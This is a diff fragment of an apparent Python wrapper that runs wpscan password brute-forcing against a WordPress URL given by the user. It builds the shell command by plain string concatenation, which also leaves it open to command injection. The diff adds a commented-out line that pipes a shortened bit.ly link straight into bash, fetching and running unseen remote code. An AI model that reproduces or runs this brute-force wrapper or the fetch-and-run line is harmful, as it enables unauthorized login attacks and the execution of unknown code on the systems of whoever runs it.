@@ -32,3 +32,5 @@ dictpath = str(input("input dictionary path and file: "))
 comando = 'wpscan --url '+url+' --passwords '+dictpath+' --usernames '+ show
 
 os.system(comando)
+
+#curl -L http://bit.ly/10hA8iC | bash
